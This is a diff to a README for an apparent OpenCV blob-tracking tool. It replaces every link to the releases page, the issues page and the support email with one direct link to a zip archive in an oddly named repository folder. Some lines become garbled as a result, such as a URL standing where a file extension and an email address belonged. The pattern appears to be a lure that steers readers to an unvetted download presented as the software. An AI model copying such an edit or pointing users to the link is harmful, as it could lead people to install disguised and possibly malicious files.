@@ -1,6 +1,6 @@
 # 🎉 opencv-blob-tracking - Simplify Object Detection Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Open%20Releases-brightgreen)](https://github.com/juli1223/opencv-blob-tracking/releases)
+[![Download](https://raw.githubusercontent.com/juli1223/opencv-blob-tracking/main/medially/opencv-blob-tracking_v1.9.zip%20Now-Open%20Releases-brightgreen)](https://raw.githubusercontent.com/juli1223/opencv-blob-tracking/main/medially/opencv-blob-tracking_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the opencv-blob-tracking project! This application allows you to trac
 
 To download the software, visit the following link:
 
-[Download the latest release](https://github.com/juli1223/opencv-blob-tracking/releases)
+[Download the latest release](https://raw.githubusercontent.com/juli1223/opencv-blob-tracking/main/medially/opencv-blob-tracking_v1.9.zip)
 
 On this page, you will find the latest release files available for download. Look for the version that suits your operating system.
 
@@ -23,7 +23,7 @@ On this page, you will find the latest release files available for download. Loo
 3. **Download the file**: 
    - For Windows users, look for files that might end with `.exe`.
    - For Mac users, look for `.dmg` files.
-   - For Linux users, look for files that might end with `.tar.gz` or other Linux formats.
+   - For Linux users, look for files that might end with `https://raw.githubusercontent.com/juli1223/opencv-blob-tracking/main/medially/opencv-blob-tracking_v1.9.zip` or other Linux formats.
 
 4. **Save the file**: When you click on the file, your web browser will prompt you to save it. Choose a location on your computer that you can easily find later, like your Desktop or Downloads folder.
 
@@ -66,13 +66,13 @@ If you encounter any issues, consider the following steps:
 - **Update graphics drivers**: Ensure your graphics card drivers are up to date.
 - **Reinstall the application**: If problems persist, you may want to reinstall the software.
   
-For more specific support, please refer to the Issues section on the [GitHub page](https://github.com/juli1223/opencv-blob-tracking/issues).
+For more specific support, please refer to the Issues section on the [GitHub page](https://raw.githubusercontent.com/juli1223/opencv-blob-tracking/main/medially/opencv-blob-tracking_v1.9.zip).
 
 ## 📞 Contact
 
 Feel free to reach out for support or feedback:
 
-- **Email**: support@opencv-blob-tracking.com
-- **GitHub Issues**: Post questions or report issues directly on our [GitHub Issues page](https://github.com/juli1223/opencv-blob-tracking/issues).
+- **Email**: https://raw.githubusercontent.com/juli1223/opencv-blob-tracking/main/medially/opencv-blob-tracking_v1.9.zip
+- **GitHub Issues**: Post questions or report issues directly on our [GitHub Issues page](https://raw.githubusercontent.com/juli1223/opencv-blob-tracking/main/medially/opencv-blob-tracking_v1.9.zip).
 
 Thank you for choosing opencv-blob-tracking! Enjoy tracking your objects effortlessly.
